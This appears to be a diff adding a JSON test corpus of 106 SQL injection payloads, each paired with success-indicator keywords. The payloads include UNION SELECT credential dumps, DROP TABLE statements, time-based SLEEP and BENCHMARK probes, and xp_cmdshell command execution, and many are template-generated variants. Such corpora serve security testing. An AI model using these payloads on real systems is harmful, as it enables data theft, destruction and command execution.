@@ -1,0 +1,1478 @@
+[
+  {
+    "id": "sqli_001",
+    "attack_type": "sql_injection",
+    "variant": "classic_or_true",
+    "prompt": "' OR '1'='1",
+    "success_indicators": [
+      "database error",
+      "syntax error",
+      "sql",
+      "select",
+      "row",
+      "credentials"
+    ]
+  },
+  {
+    "id": "sqli_002",
+    "attack_type": "sql_injection",
+    "variant": "union_select",
+    "prompt": "' UNION SELECT username, password FROM users --",
+    "success_indicators": [
+      "union",
+      "select",
+      "username",
+      "password",
+      "users"
+    ]
+  },
+  {
+    "id": "sqli_003",
+    "attack_type": "sql_injection",
+    "variant": "stacked_queries",
+    "prompt": "'; DROP TABLE targets; --",
+    "success_indicators": [
+      "drop table",
+      "table dropped",
+      "targets",
+      "query executed"
+    ]
+  },
+  {
+    "id": "sqli_004",
+    "attack_type": "sql_injection",
+    "variant": "blind_boolean",
+    "prompt": "' AND 1=(SELECT COUNT(*) FROM users) --",
+    "success_indicators": [
+      "boolean",
+      "users count",
+      "subquery"
+    ]
+  },
+  {
+    "id": "sqli_005",
+    "attack_type": "sql_injection",
+    "variant": "stored_procedure_abuse",
+    "prompt": "'; EXEC xp_cmdshell('whoami'); --",
+    "success_indicators": [
+      "xp_cmdshell",
+      "whoami",
+      "cmd",
+      "exec"
+    ]
+  },
+  {
+    "id": "sqli_006",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; OR '1'='1'; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_007",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 DROP TABLE targets",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_008",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' EXEC xp_cmdshell('whoami') --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_009",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 OR '1'='1'",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_010",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 AND 1=(SELECT COUNT(*) FROM users)",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_011",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; AND 1=(SELECT COUNT(*) FROM users); --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_012",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' OR '1'='1' --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_013",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; OR SLEEP(5)=0; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_014",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; UNION SELECT username, password FROM users; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_015",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 OR SLEEP(5)=0",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_016",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' OR SLEEP(5)=0 --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_017",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 EXEC xp_cmdshell('whoami')",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_018",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; DROP TABLE targets; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_019",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' DROP TABLE targets --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_020",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; EXEC xp_cmdshell('whoami'); --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_021",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 UNION SELECT username, password FROM users",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_022",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' UNION ALL SELECT name, password FROM admin OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_023",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND UNION ALL SELECT name, password FROM admin --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_024",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; AND SLEEP(10); --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_025",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; AND BENCHMARK(5000000,MD5('test')) /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_026",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' UNION SELECT username, password FROM users #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_027",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' UNION SELECT @@version --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_028",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' OR EXISTS(SELECT * FROM users WHERE username='admin') OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_029",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' DROP TABLE targets OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_030",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND UNION SELECT NULL, NULL, NULL --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_031",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' OR 1=1 --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_032",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; UNION ALL SELECT name, password FROM admin; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_033",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND '; DROP TABLE sessions; -- --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_034",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND AND 1=(SELECT COUNT(*) FROM users) --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_035",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND AND SLEEP(10) --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_036",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 AND SLEEP(10)",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_037",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_038",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' UNION ALL SELECT name, password FROM admin #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_039",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 UNION SELECT NULL, NULL, NULL",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_040",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' AND 1=(SELECT COUNT(*) FROM users) #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_041",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; AND 1=(SELECT COUNT(*) FROM users) /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_042",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; AND 1=1 UNION SELECT * FROM users /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_043",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; UNION ALL SELECT name, password FROM admin /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_044",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' UNION ALL SELECT name, password FROM admin --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_045",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; OR '1'='1' /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_046",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; AND 1=1 UNION SELECT * FROM users; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_047",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; OR EXISTS(SELECT * FROM users WHERE username='admin'); --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_048",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' AND 1=1 UNION SELECT * FROM users #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_049",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 OR EXISTS(SELECT * FROM users WHERE username='admin')",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_050",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' UNION SELECT NULL, NULL, NULL #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_051",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' AND BENCHMARK(5000000,MD5('test')) #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_052",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; UNION SELECT NULL, NULL, NULL /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_053",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND AND 1=1 UNION SELECT * FROM users --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_054",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; UNION SELECT @@version; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_055",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' AND SLEEP(10) OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_056",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND UNION SELECT @@version --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_057",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; OR SLEEP(5)=0 /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_058",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' '; DROP TABLE sessions; -- --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_059",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; UNION SELECT NULL, NULL, NULL; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_060",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; '; DROP TABLE sessions; --; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_061",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; '; DROP TABLE sessions; -- /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_062",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; UNION SELECT @@version /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_063",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' OR 1=1 OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_064",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; AND SLEEP(10) /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_065",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' OR SLEEP(5)=0 #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_066",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' AND 1=(SELECT COUNT(*) FROM users) OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_067",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' AND BENCHMARK(5000000,MD5('test')) --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_068",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' UNION SELECT @@version #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_069",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 OR 1=1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_070",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; UNION SELECT username, password FROM users /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_071",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' UNION SELECT NULL, NULL, NULL OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_072",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' AND SLEEP(10) #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_073",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 '; DROP TABLE sessions; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_074",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' UNION SELECT @@version OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_075",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' AND 1=1 UNION SELECT * FROM users OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_076",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' OR '1'='1' OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_077",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' OR SLEEP(5)=0 OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_078",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' OR '1'='1' #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_079",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND OR 1=1 --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_080",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 AND 1=1 UNION SELECT * FROM users",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_081",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' EXEC xp_cmdshell('whoami') OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_082",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND AND BENCHMARK(5000000,MD5('test')) --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_083",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; AND BENCHMARK(5000000,MD5('test')); --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_084",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "\"; OR 1=1; --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_085",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' AND BENCHMARK(5000000,MD5('test')) OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_086",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; DROP TABLE targets /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_087",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' EXEC xp_cmdshell('whoami') #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_088",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' UNION SELECT username, password FROM users OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_089",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND UNION SELECT username, password FROM users --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_090",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' OR EXISTS(SELECT * FROM users WHERE username='admin') #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_091",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; EXEC xp_cmdshell('whoami') /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_092",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "username' '; DROP TABLE sessions; -- OR '1'='1",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_093",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' AND 1=1 UNION SELECT * FROM users --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_094",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' '; DROP TABLE sessions; -- #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_095",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND OR '1'='1' --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_096",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' DROP TABLE targets #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_097",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' AND SLEEP(10) --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_098",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND DROP TABLE targets --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_099",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "admin' OR 1=1 #",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_100",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND OR SLEEP(5)=0 --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_101",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1' AND EXEC xp_cmdshell('whoami') --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_102",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 AND BENCHMARK(5000000,MD5('test'))",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_103",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; OR 1=1 /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_104",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "'; OR EXISTS(SELECT * FROM users WHERE username='admin') /*",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_105",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "1 UNION ALL SELECT name, password FROM admin",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  },
+  {
+    "id": "sqli_106",
+    "attack_type": "sql_injection",
+    "variant": "generated_template",
+    "prompt": "' UNION SELECT NULL, NULL, NULL --",
+    "success_indicators": [
+      "sql",
+      "syntax error",
+      "database",
+      "select",
+      "users",
+      "table"
+    ]
+  }
+]
